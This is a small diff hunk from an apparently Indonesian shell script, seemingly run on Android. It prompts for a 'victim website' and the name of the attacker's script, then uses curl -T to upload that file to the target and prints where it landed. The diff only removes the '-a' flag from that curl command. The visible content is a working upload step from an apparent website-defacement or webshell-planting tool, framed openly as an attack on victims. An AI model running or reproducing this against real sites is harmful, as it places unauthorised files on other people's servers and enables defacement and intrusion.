@@ -30,7 +30,7 @@ sleep 2
 echo ""
 read -p "Masukkan web korban  ~# " target;
 read -p "Nama script lu coeg  ~# "  sc;
-curl -a -T /storage/emulated/0/$sc $target
+curl -T /storage/emulated/0/$sc $target
 echo "$yellow Hasilnya :v |==>"  $target/$sc;
 
 
